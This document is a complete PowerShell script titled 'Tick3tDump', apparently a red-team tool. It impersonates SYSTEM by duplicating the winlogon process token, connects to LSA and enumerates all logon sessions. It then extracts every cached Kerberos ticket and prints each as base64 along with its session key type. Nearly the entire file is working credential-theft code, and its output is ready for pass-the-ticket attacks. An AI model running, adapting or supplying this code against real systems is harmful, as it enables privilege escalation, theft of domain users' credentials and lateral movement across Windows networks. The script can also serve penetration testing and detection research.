$ErrorActionPreference = "SilentlyContinue"
$systemname = "NT.AUT.*\\"

function showAwesomeBanner{
    write-host "

             .AMMMMMISHAMMA.
       .AV. :::.:.:.::MA.
      A' :..        : .:`A
     A'..              . `A.
    A' :.    :::::::::  : :`A
    M  .    :::.:.:.:::  . .M
    M  :   ::.:.....::.:   .M
    V : :.::.:........:.:  :V
   A  A:    ..:...:...:.   A A
  .V  MA:.....:M.::.::. .:AM.M
 A'  .VMMMMISHAMM:.:AMMMISHAMV: A
:M .  .`VMISHAMV.:A `VMMMMV .:M:
 V.:.  ..`VMMMV.:AM..`VMV' .: V
  V.  .:. .....:AMMA. . .:. .V
   VMM...: ...:.MMMM.: .: MMV
       `VM: . ..M.:M..:::M'
         `M::. .:.... .::M
          M:.  :. .... ..M
          V:  M:. M. :M .V
          `V.:M.. M. :M.V'
 ______  ___        __     ____  __    ___                 ___ 
/_  __/ <  / ____  / /__  |_  / / /_  / _ \ __ __  __ _   / _ \
 / /    / / / __/ /  '_/ _/_ < / __/ / // // // / /  ' \ / ___/
/_/    /_/  \__/ /_/\_\ /____/ \__/ /____/ \_,_/ /_/_/_//_/    
                                                    Powershell"

    write-host "        Michael Zhmaylo ( https://github.com/MzHmO )"
}

function Invoke-AsSystem {
    $winlogonPid = Get-Process -Name "winlogon" | Select-Object -First 1 -ExpandProperty Id

    if (($processHandle = [impsys.win32]::OpenProcess(
            0x400,
            $true,
            [Int32]$winlogonPid)) -eq [IntPtr]::Zero)
    {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
    }

    $tokenHandle = [IntPtr]::Zero
    if (-not [impsys.win32]::OpenProcessToken(
            $processHandle,
            0x0E,
            [ref]$tokenHandle))
    {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
    }

    $dupTokenHandle = [IntPtr]::Zero
    if (-not [impsys.win32]::DuplicateTokenEx(
            $tokenHandle,
            0x02000000,
            [IntPtr]::Zero,
            0x02,
            0x01,
            [ref]$dupTokenHandle))
    {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
    }

    try {
        if (-not [impsys.win32]::ImpersonateLoggedOnUser(
                $dupTokenHandle))
        {
            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "$([ComponentModel.Win32Exception]$err)"
        }

        $currentname = $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
        if ($currentname -match $systemname){
            return $true
        } else{
            return $false
        }

    } catch {
        return $false
    }

    return $false
}
Function LsaRegisterLogonProcess()
    {
       $logonProcessName = "User32LogonProcess"
       $LSAString = new-object ticket.dump+LSA_STRING_IN
       $lsah = New-Object System.IntPtr
       [System.UInt64]$SecurityMode = 0

       $LSAString.Length = [System.UInt16]$logonProcessName.Length
       $LSAString.MaximumLength = [System.UInt16]($logonProcessName.Length + 1)
       $LSAString.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($logonProcessName)

       [int]$ret = [ticket.dump]::LsaRegisterLogonProcess($LSAString,[ref]$lsah,[ref]$SecurityMode)
       if ($ret -ne 0){
        write-host "[-] Error in LsaRegisterLogonProcess. Using LsaConnectUntrusted: ", $ret
        $DumpAllTkt = $false
        return $(LsaConnectUntrusted)
       }
       return $lsah
    }

function LsaConnectUntrusted {
    $lsah = New-Object System.IntPtr
    [int]$retcode = [ticket.dump]::LsaConnectUntrusted([ref]$lsah)
    if ($retcode -ne 0){
        throw "Cant connect to lsa using LsaConnectUntrusted"
        return -1
    }
    return $lsah

}
Function Get-lsah()
{
    $lsah = New-Object System.IntPtr
    $sysres = Invoke-AsSystem
    if ($sysres){
        write-host "[!] System Impersonation Success"
        write-host "[!] Using LsaRegisterLogonProcess to connect"
        $DumpAllTkt = $true
        return $(LsaRegisterLogonProcess)

    } else{
        write-host "[!] System Impersonation Failed"
        write-host "[!] Using LsaConnectUntrusted to connect"
        $DumpAllTkt = $false
        return $(LsaConnectUntrusted)
    }
}

Function GetLogonSessionData($luid)
    {
        $luidptr = New-Object System.IntPtr
        $sessionDataPtr = New-Object System.IntPtr

        try
        {
            $luidptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($luid))
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($luid,$luidptr,$false)

            $ret = [ticket.dump]::LsaGetLogonSessionData($luidptr,[ref]$sessionDataPtr)
            if($ret -eq 0)
            {
                $type = New-Object ticket.dump+SECURITY_LOGON_SESSION_DATA
                $type = $type.GetType()
                [ticket.dump+SECURITY_LOGON_SESSION_DATA]$unsafeData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($sessionDataPtr,[type]$type)
                $logonSessionData = New-Object ticket.dump+LogonSessionData
            
                $logonSessionData.AuthenticationPackage = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.AuthenticationPackage.Buffer, $unsafeData.AuthenticationPackage.Length / 2)
                $logonSessionData.DnsDomainName = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.DnsDomainName.Buffer, $unsafeData.DnsDomainName.Length / 2)
                $logonSessionData.LogonID = $unsafeData.LogonID
                $logonSessionData.LogonTime = [System.DateTime]::FromFileTime($unsafeData.LogonTime)
                $logonSessionData.LogonServer = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.LogonServer.Buffer,$unsafeData.LogonServer.Length / 2)
                [ticket.dump+LogonType]$logonSessionData.LogonType = $unsafeData.LogonType
                $logonSessionData.Sid = New-Object System.Security.Principal.SecurityIdentifier($unsafeData.PSid)
                $logonSessionData.Upn = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.Upn.Buffer,$unsafeData.Upn.Length /2)
                $logonSessionData.Session = [int]$unsafeData.Session
                $logonSessionData.username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.username.Buffer,$unsafeData.username.Length /2)
                $logonSessionData.LogonDomain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($unsafeData.LogonDomain.buffer,$unsafeData.LogonDomain.Length /2)
            }
        }

        finally
        {
            if($sessionDataPtr -ne [System.IntPtr]::Zero){[ticket.dump]::LsaFreeReturnBuffer($sessionDataPtr)|Out-Null}
            if($luidptr -ne [System.IntPtr]::Zero){[ticket.dump]::LsaFreeReturnBuffer($luidptr)|Out-Null}
        }
    
        return $logonSessionData
    }
Function GetCurrentLuid()
{
    $output = klist
    return $output.split("`n")[1].split(":")[1]
}
Function RunningAsAdmin()
{
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $princ = New-Object System.Security.Principal.WindowsPrincipal($user)
    if($princ.IsInRole("Administrators") -or $princ.IsInRole("Администраторы") -or $user.Name -match $systemname){return $true}
    else{return $false}
}

Function ExtractTicket([intptr]$lsaHandle,[int]$authPackage,[ticket.dump+LUID]$luid=(New-Object ticket.dump+LUID),[string]$targetname,[System.UInt32]$ticketFlags = 0,$ticket)
{
    $responsePointer = [System.IntPtr]::Zero
    $request = New-Object ticket.dump+KERB_RETRIEVE_TKT_REQUEST
    $requestType = $request.GetType()
    $response = New-Object ticket.dump+KERB_RETRIEVE_TKT_RESPONSE
    $responseType = $response.GetType()
    $returnBufferLength = 0
    $protocolStatus = 0

    $request.MessageType = [ticket.dump+KERB_PROTOCOL_MESSAGE_TYPE]::KerbRetrieveEncodedTicketMessage
    $request.LogonId = $luid
    $request.TicketFlags = 0x0
    $request.CacheOptions = 0x8
    $request.EncryptionType = 0x0

    $tname = New-Object ticket.dump+UNICODE_STRING
    $tname.Length = [System.UInt16]($targetname.Length * 2)
    $tname.MaximumLength = [System.UInt16](($tname.Length) + 2)
    $tname.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($targetname)

    $request.TargetName = $tname

    $structSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$requestType)
    $newStructSize = $structSize + $tname.MaximumLength
    $unmanagedAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($newStructSize)

    [System.Runtime.InteropServices.Marshal]::StructureToPtr($request,$unmanagedAddr,$false)

    $newTargetNameBuffPtr = [System.IntPtr]([System.Int64]($unmanagedAddr.ToInt64() + [System.Int64]$structSize))

    [ticket.dump]::CopyMemory($newTargetNameBuffPtr,$tname.buffer,$tname.MaximumLength) 
    if([System.IntPtr]::Size -eq 8){$size = 24}
    else{$size = 16}
    [System.Runtime.InteropServices.Marshal]::WriteIntPtr($unmanagedAddr,$size,$newTargetNameBuffPtr)

    $retcode = [ticket.dump]::LsaCallAuthenticationPackage($lsaHandle,$authPackage,$unmanagedAddr,$newStructSize,[ref]$responsePointer,[ref]$returnBufferLength,[ref]$protocolStatus)

    if(($retcode -eq 0) -and ($returnBufferLength -ne 0))
    {
        $response = [System.Runtime.InteropServices.Marshal]::PtrToStructure($responsePointer,[type]$responseType)
    
        $encodedTicketSize = $response.Ticket.EncodedTicketSize

        $encodedTicket = [System.Array]::CreateInstance([byte],$encodedTicketSize)
        [System.Runtime.InteropServices.Marshal]::Copy($response.Ticket.EncodedTicket,$encodedTicket,0,$encodedTicketSize)
    }

    [ticket.dump]::LsaFreeReturnBuffer($responsePointer)
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($unmanagedAddr)
    # DEBUG PURPOSES
    #write-host "B64: ", $([Convert]::ToBase64String($encodedTicket))
    $ticketobj = New-Object psobject
    $ticketobj | Add-Member -Type NoteProperty -Name "success" -Value $true
    try {
    $ticketobj | Add-Member -Type NoteProperty -Name "Ticket" -Value $([Convert]::ToBase64String($encodedTicket))
    $ticketobj | Add-Member -Type NoteProperty -Name "SessionKeyType" -Value  $response.Ticket.SessionKey.KeyType
    } catch {
        $ticketobj.success = $false
    }
    return $ticketobj
}

Function EnumerateLogonSessions()
    {
        $luids = @()
        if(!(RunningAsAdmin))
        {
            $strLuid = GetCurrentLuid
            $intLuid = [convert]::ToInt32($strluid,16)
            $luid = New-Object ticket.dump+LUID
            $luid.LowPart = $intLuid
            $luids += $luid
        }

        else
        {
           $count = New-Object System.Int32
           $luidptr = New-Object System.IntPtr 
           $ret = [ticket.dump]::LsaEnumerateLogonSessions([ref]$count,[ref]$luidptr)
           if($ret -ne 0){Write-Host "[-] Cant enum logon sessions: ", $ret}
           else
           {
                $Luidtype = New-Object ticket.dump+LUID
                $Luidtype = $Luidtype.GetType()
                for($i = 0; $i -lt [int32]$count;$i++)
                {
                    $luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($luidptr,[type]$Luidtype)
                    $luids += $luid
                    [System.IntPtr]$luidptr = $luidptr.ToInt64() + [System.Runtime.InteropServices.Marshal]::SizeOf([type]$Luidtype)
                }
                [ticket.dump]::LsaFreeReturnBuffer($luidptr)
           }
        }
        return $luids
    }

    Function DisplaySessionCreds($sessioncreds)
    {
        foreach($sessioncred in $sessioncreds)
        {

            if ($sessioncred.Ticketb64 -ne $null){
            if((@($sessioncred).Count -gt 0) -and ($sessioncred[0].LogonSession[0].LogonID.LowPart -ne "0") )
            {
                $print_object = New-Object psobject
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "UserName" -Value $sessioncred[0].LogonSession.username
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "Domain" -Value $sessioncred[0].LogonSession.LogonDomain
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonId" -Value ("0x{0:x}" -f $sessioncred[0].LogonSession.LogonId.LowPart)
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "UserSid" -Value $sessioncred[0].LogonSession.Sid
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "AuthenticationPackage" -Value $sessioncred[0].LogonSession.AuthenticationPackage
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonType" -Value $sessioncred[0].LogonSession.logonType
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonTime" -Value $sessioncred[0].LogonSession.logonTime
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "LogonServerDnsDomain" -Value $sessioncred[0].LogonSession.DnsDomainName
                Add-Member -InputObject $print_object -MemberType NoteProperty -Name "UserPrincipalName" -Value $sessioncred[0].LogonSession.Upn

                Write-Host "------------------------------------------------------------------------------------------------------------------"
                $print_object
                Write-Host "[*]Enumerated " @($sessioncred).Count "tickets`n" -ForegroundColor Green
                foreach($ticket in $sessioncred)
                {
                    Write-Host "    Service Name       : " $ticket.ServerName
                    Write-Host "    EncryptionType     : " ([ticket.dump+EncTypes]$ticket.EncryptionType)
                    Write-Host "    Start/End/MaxRenew : " $ticket.StartTime ";" $ticket.EndTime ";" $ticket.RenewTime
                    Write-Host "    Server Name        : " $ticket.ServerName.split("/")[1] "@" $ticket.ServerRealm
                    Write-Host "    Client Name        : " $ticket.ClientName "@" $ticket.ClientRealm
                    Write-Host "    Flags              : " $ticket.TicketFlags
        
                        Write-Host "    Ticket      : " $ticket.Ticketb64
          
                    if($ticket.SessionKeyType){Write-Host "    Session Key Type   : " $ticket.SessionKeyType "`n"}
                }
                Write-Host "------------------------------------------------------------------------------------------------------------------"
                Write-Host "`n`n"
            }
        }
    }
    }
function main{
    showAwesomeBanner

    # Initializing DotNet and Add-Type with Structures and LSA Functions

    $tickdotnet = @"
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
        public UInt32 LowPart;
        public Int32 HighPart;
    }

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaConnectUntrusted([Out] out IntPtr LsaHandle);

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING_IN
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr buffer;
    }  

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int LsaRegisterLogonProcess(LSA_STRING_IN LogonProcessName,out IntPtr LsaHandle,out ulong SecurityMode);

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaLookupAuthenticationPackage([In] IntPtr LsaHandle,[In] ref LSA_STRING_IN PackageName,[Out] out UInt32 AuthenticationPackage);

    [DllImport("Secur32.dll", SetLastError = false)]
    public static extern int LsaEnumerateLogonSessions(out uint LogonSessionCount, out IntPtr LogonSessionList);

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaFreeReturnBuffer([In] IntPtr buffer);

    public enum LogonType
    {
        UndefinedLogonType,
        Interactive,
        Network,
        Batch,
        Service,
        Proxy,
        Unlock,
        NetworkCleartext,
        NewCredentials,
        RemoteInteractive,
        CachedInteractive,
        CachedRemoteInteractive,
        CachedUnlock
    }

    public class LogonSessionData
    {
        public LUID LogonID;
        public string username;
        public string LogonDomain;
        public string AuthenticationPackage;
        public LogonType logonType;
        public int Session;
        public SecurityIdentifier Sid;
        public DateTime LogonTime;
        public string LogonServer;
        public string DnsDomainName;
        public string Upn;
    }

    public struct SECURITY_LOGON_SESSION_DATA
    {
        public UInt32 size;
        public LUID LogonID;
        public LSA_STRING_IN username;
        public LSA_STRING_IN LogonDomain;
        public LSA_STRING_IN AuthenticationPackage;
        public UInt32 logontype;
        public UInt32 Session;
        public IntPtr PSid;
        public UInt64 LogonTime;
        public LSA_STRING_IN LogonServer;
        public LSA_STRING_IN DnsDomainName;
        public LSA_STRING_IN Upn;
    }
     
    [DllImport("Secur32.dll", SetLastError = false)]
    public static extern uint LsaGetLogonSessionData(IntPtr luid, out IntPtr ppLogonSessionData);

    public enum KERB_PROTOCOL_MESSAGE_TYPE 
    {
      KerbDebugRequestMessage,
      KerbQueryTicketCacheMessage,
      KerbChangeMachinePasswordMessage,
      KerbVerifyPacMessage,
      KerbRetrieveTicketMessage,
      KerbUpdateAddressesMessage,
      KerbPurgeTicketCacheMessage,
      KerbChangePasswordMessage,
      KerbRetrieveEncodedTicketMessage,
      KerbDecryptDataMessage,
      KerbAddBindingCacheEntryMessage,
      KerbSetPasswordMessage,
      KerbSetPasswordExMessage,
      KerbVerifyCredentialMessage,
      KerbQueryTicketCacheExMessage,
      KerbPurgeTicketCacheExMessage,
      KerbRefreshSmartcardCredentialsMessage,
      KerbAddExtraCredentialsMessage,
      KerbQuerySupplementalCredentialsMessage,
      KerbTransferCredentialsMessage,
      KerbQueryTicketCacheEx2Message,
      KerbSubmitTicketMessage,
      KerbAddExtraCredentialsExMessage
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_QUERY_TKT_CACHE_REQUEST
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public LUID LogonId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_TICKET_CACHE_INFO_EX
    {
        public UNICODE_STRING ClientName;
        public UNICODE_STRING ClientRealm;
        public UNICODE_STRING ServerName;
        public UNICODE_STRING ServerRealm;
        public long StartTime;
        public long EndTime;
        public long RenewTime;
        public uint EncryptionType;
        public uint TicketFlags;
    }

    [Flags]
    public enum TicketFlags : uint
    {
        name_canonicalize = 0x10000,
        forwardable = 0x40000000,
        forwarded = 0x20000000,
        hw_authent = 0x00100000,
        initial = 0x00400000,
        invalid = 0x01000000,
        may_postdate = 0x04000000,
        ok_as_delegate = 0x00040000,
        postdated = 0x02000000,
        pre_authent = 0x00200000,
        proxiable = 0x10000000,
        proxy = 0x08000000,
        renewable = 0x00800000,
        reserved = 0x80000000,
        reserved1 = 0x00000001
    }

    public enum EncTypes : uint
    {
        DES_CBC_CRC = 0x0001,
        DES_CBC_MD4 = 0x0002,
        DES_CBC_MD5 = 0x0003,
        DES_CBC_raw = 0x0004,
        DES3_CBC_raw = 0x0006,
        DES3_CBC_SHA_1 = 0x0010,
        AES128_CTS_HMAC_SHA1_96 = 0x0011,
        AES256_CTS_HMAC_SHA1_96 = 0x0012,
        AES128_cts_hmac_sha256_128 = 0x0013,
        AES256_cts_hmac_sha384_192 = 0x0014,
        RC4_HMAC_MD5 = 0x0017,
        RC4_HMAC_MD5_EXP = 0x0018
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_QUERY_TKT_CACHE_RESPONSE
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public int CountOfTickets;
        public IntPtr Tickets;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_HANDLE
    {
        public IntPtr LowPart;
        public IntPtr HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_RETRIEVE_TKT_REQUEST
    {
        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
        public LUID LogonId;
        public UNICODE_STRING TargetName;
        public uint TicketFlags;
        public uint CacheOptions;
        public int EncryptionType;
        public SECURITY_HANDLE CredentialsHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_CRYPTO_KEY
    {
        public int KeyType;
        public int Length;
        public IntPtr Value;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_EXTERNAL_TICKET
    { 
      public IntPtr ServiceName;
      public IntPtr TargetName;
      public IntPtr ClientName;
      public UNICODE_STRING      DomainName;
      public UNICODE_STRING      TargetDomainName;
      public UNICODE_STRING      AltTargetDomainName;
      public KERB_CRYPTO_KEY     SessionKey;
      public uint                TicketFlags;
      public uint                Flags;
      public long                KeyExpirationTime;
      public long                StartTime;
      public long                EndTime;
      public long                RenewUntil;
      public long                TimeSkew;
      public int                 EncodedTicketSize;
      public IntPtr              EncodedTicket;
    } 

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_RETRIEVE_TKT_RESPONSE
    {
        public KERB_EXTERNAL_TICKET Ticket;
    }
    
    [DllImport("Secur32.dll", SetLastError = true)]
    public static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle,uint AuthenticationPackage,IntPtr ProtocolSubmitBuffer,int SubmitBufferLength,out IntPtr ProtocolReturnBuffer,out ulong ReturnBufferLength,out int ProtocolStatus);

    [DllImport("secur32.dll", SetLastError=false)]
    public static extern int LsaDeregisterLogonProcess([In] IntPtr LsaHandle);


    [DllImport("kernel32.dll", EntryPoint = "CopyMemory", SetLastError = false)]
    public static extern void CopyMemory(IntPtr dest, IntPtr src, uint count);
"@
    $tickasm = [System.Reflection.Assembly]::LoadWithPartialName("System.Security.Principal")
    Add-Type -MemberDefinition $tickdotnet -Namespace "ticket" -Name "dump" -ReferencedAssemblies $tickasm.location -UsingNamespace System.Security.Principal

    # Initializing functions for impersonate system
    try {
        & {
            $ErrorActionPreference = 'Stop'
            [void] [impsys.win32]
        }
    } catch {
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        namespace impsys {
            public class win32 {

                [DllImport("kernel32.dll", SetLastError=true)]
                public static extern bool CloseHandle(
                    IntPtr hHandle);

                [DllImport("kernel32.dll", SetLastError=true)]
                public static extern IntPtr OpenProcess(
                    uint processAccess,
                    bool bInheritHandle,
                    int processId);

                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern bool OpenProcessToken(
                    IntPtr ProcessHandle, 
                    uint DesiredAccess,
                    out IntPtr TokenHandle);

                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern bool DuplicateTokenEx(
                    IntPtr hExistingToken,
                    uint dwDesiredAccess,
                    IntPtr lpTokenAttributes,
                    uint ImpersonationLevel,
                    uint TokenType,
                    out IntPtr phNewToken);

                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern bool ImpersonateLoggedOnUser(
                    IntPtr hToken);

                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern bool RevertToSelf();
            }
        }
"@
    }
    # Receiving Lsa String
    $authpckg = New-Object System.Int32
    $rc = New-Object System.Int32
    $krbname = "kerberos"

    $LSAString = New-Object ticket.dump+LSA_STRING_IN
    $LSAString.Length = [uint16]$krbname.Length
    $LSAString.MaximumLength = [uint16]($krbname.Length + 1)
    $LSAString.buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($krbname)

    # Getting Lsa Handle
    $lsah = Get-lsah
    write-host "[!] Lsa Handle: ", $lsah

    # Connecting to AP
    $retcode = [ticket.dump]::LsaLookupAuthenticationPackage($lsah,[ref]$LSAString,[ref]$authpckg)
    if ($retcode -ne 0){
        write-host "[-] Cant LookupAuthenticationPackage", $retcode
        return -1
    }

    write-host "[+] Kerberos AP: ", $authpckg

    foreach($luid in EnumerateLogonSessions){
        if ($([System.Convert]::ToString($luid.LowPart,16) -eq 0x0)){
           continue;
        } else{
            #write-host "    [?] LUID: 0x$([System.Convert]::ToString($luid.HighPart,16) )$([System.Convert]::ToString($luid.LowPart,16))"
            $logonSessionData = New-Object ticket.dump+LogonSessionData
            try {
                $logonSessionData = GetLogonSessionData($luid)
            } catch{
                continue
            }
                $sessioncred = @()

            $ticketsPointer = New-Object System.IntPtr
            $returnBufferLength = 0
            $protocolStatus = 0

            $ticketCacheRequest = New-Object ticket.dump+KERB_QUERY_TKT_CACHE_REQUEST
            $ticketCacheRespone = New-Object ticket.dump+KERB_QUERY_TKT_CACHE_RESPONSE
            $ticketCacheResponeType = $ticketCacheRespone.GetType()
            $ticketCacheResult = New-Object ticket.dump+KERB_TICKET_CACHE_INFO_EX

            $ticketCacheRequest.MessageType = [ticket.dump+KERB_PROTOCOL_MESSAGE_TYPE]::KerbQueryTicketCacheExMessage
            if(RunningAsAdmin){
                $ticketCacheRequest.LogonId = $logonSessionData.LogonID
            }
            else{
                $ticketCacheRequest.LogonId = New-Object ticket.dump+LUID
            }
            $tQueryPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($ticketCacheRequest))
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ticketCacheRequest,$tQueryPtr,$false)
            $retcode = [ticket.dump]::LsaCallAuthenticationPackage($lsah,$authpckg,$tQueryPtr,[System.Runtime.InteropServices.Marshal]::SizeOf($ticketCacheRequest),[ref]$ticketsPointer,[ref]$returnBufferLength,[ref]$protocolStatus)
            if(($retcode -eq 0) -and ($ticketsPointer -ne [System.IntPtr]::Zero))
            {    
            #write-host "   [+] Calling AP Kerberos success"
            [ticket.dump+KERB_QUERY_TKT_CACHE_RESPONSE]$ticketCacheRespone = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ticketsPointer,[type]$ticketCacheResponeType)
            $count2 = $ticketCacheRespone.CountOfTickets
            if($count2 -ne 0)
            {
                $cacheInfoType = $ticketCacheResult.GetType()
                $dataSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type]$cacheInfoType)
                for($j = 0;$j -lt $count2;$j++)
                {
                    [System.IntPtr]$currTicketPtr = [int64]($ticketsPointer.ToInt64() + [int](8 + $j * $dataSize))
                    [ticket.dump+KERB_TICKET_CACHE_INFO_EX]$ticketCacheResult = [System.Runtime.InteropServices.Marshal]::PtrToStructure($currTicketPtr,[type]$cacheInfoType)

                    $ticket = New-Object psobject
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name "StartTime" -value  ([datetime]::FromFileTime($ticketCacheResult.StartTime))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name "EndTime" -value  ([datetime]::FromFileTime($ticketCacheResult.EndTime))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name  "RenewTime" -value ([datetime]::FromFileTime($ticketCacheResult.RenewTime))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -Name "TicketFlags" -Value ([ticket.dump+TicketFlags]$ticketCacheResult.TicketFlags)
                    Add-Member -InputObject $ticket -MemberType NoteProperty -Name "EncryptionType" -Value $ticketCacheResult.EncryptionType
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name  "ServerName" -value  ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheResult.ServerName.Buffer,$ticketCacheResult.ServerName.Length / 2))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name  "ServerRealm" -value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheResult.ServerRealm.Buffer,$ticketCacheResult.ServerRealm.Length / 2))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name  "ClientName" -value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheResult.ClientName.Buffer,$ticketCacheResult.ClientName.Length / 2))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -name "ClientRealm" -value ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($ticketCacheResult.ClientRealm.Buffer,$ticketCacheResult.ClientRealm.Length / 2))
                    Add-Member -InputObject $ticket -MemberType NoteProperty -Name "LogonSession" -Value $logonSessionData
                    
                    $InfoObj = (ExtractTicket $lsah $authpckg $ticketCacheRequest.LogonId $ticket.ServerName $ticketCacheResult.TicketFlags $ticket)
                    if ($InfoObj.success -eq $true){
                    $SessionEncType = $InfoObj.SessionKeyType
                    $Ticketb64 = $InfoObj.Ticket
                    Add-Member -InputObject $ticket -MemberType NoteProperty -Name "Ticketb64" -Value $Ticketb64
                    try
                    {
                        if($SessionEncType -ne 0 ){Add-Member -InputObject $ticket -MemberType NoteProperty -Name "SessionKeyType" -Value ([ticket.dump+EncTypes]$SessionEncType)}
                    }
                    catch{}

                    } else {
                        #write-host "    [-] Cant recover TKT. May be outdated"
                    }
                    $sessioncred += $ticket
                }
            }
        
        }
      
      [ticket.dump]::LsaFreeReturnBuffer($ticketsPointer)|Out-Null
      [System.Runtime.InteropServices.Marshal]::FreeHGlobal($tQueryPtr)
      $sessioncreds += @(,$sessioncred)
        }
    }
    [ticket.dump]::LsaDeregisterLogonProcess($lsah)|Out-Null
    DisplaySessionCreds $sessioncreds
}

$DumpAllTkt = $false
main